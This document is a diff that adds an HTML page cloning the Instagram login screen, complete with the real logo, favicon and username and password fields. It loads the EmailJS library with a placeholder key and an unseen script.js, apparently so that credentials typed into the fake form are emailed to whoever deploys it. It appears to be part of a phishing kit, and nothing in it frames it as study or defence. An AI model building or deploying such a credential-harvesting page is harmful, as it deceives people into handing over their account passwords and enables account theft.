@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
+</head>
+
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
+                        alt="Instagram">
+                </div>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" id="button">Log In</button>
+                </form>
+                <div class="divider">
+                    <span class="line"></span>
+                    <span class="or">OR</span>
+                    <span class="line"></span>
+                </div>
+                <div class="fb-login">
+                    <img src="fb.png" alt="Facebook">
+                    <span>Log in with Facebook</span>
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-links">
+                    <a href="#"><img src="appstore.png" alt="App Store"></a>
+                    <a href="#"><img src="playstore.png" alt="Play Store"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Load EmailJS first -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("your mailjs public key"); // Add your EmailJS public key here
+        })();
+    </script>
+    <!-- Load our script after EmailJS -->
+    <script type="text/javascript" src="script.js"></script>
+</body>
+
+</html>
